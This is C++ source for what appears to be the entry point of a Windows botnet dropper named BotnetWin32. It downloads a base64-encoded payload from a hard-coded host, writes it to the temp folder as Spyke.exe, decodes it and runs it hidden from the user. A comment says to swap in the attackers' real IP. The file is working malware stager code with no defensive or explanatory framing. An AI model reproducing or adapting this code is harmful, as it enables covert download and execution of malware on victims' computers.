// BotnetWin32.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Dropper.h"
#include "Utils.h"
#include "Connection.h"
#include "base64.h"

char* ip = "192.168.0.45";
TCHAR buf[255] = { 0 };
Utils utils;
base64 base;
//Connection conn(ip, 5000);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	// change this IP to our actual IP then
	TCHAR url[] = TEXT("http://192.168.0.45");
	TCHAR path[MAX_PATH + 1];
	DWORD len = MAX_PATH + 1;
	GetTempPath(len, path);
	TCHAR* full_path = _tcscat(path, L"Spyke.exe");
	wstring ws(full_path);
	string Path = string(ws.begin(), ws.end());
	utils.DownloadFile(url, full_path);

	ifstream ffi(full_path);
	string based_string;
	ffi >> based_string;
	based_string = base.base64_decode(based_string);
	ffi.close();
	ofstream ffo(full_path, ios::binary);
	ffo << based_string;
	ffo.close();

	WinExec(Path.c_str(), SW_HIDE);
	/*
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (CreateProcessW((TCHAR *)Path.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	*/

	return 0;
}

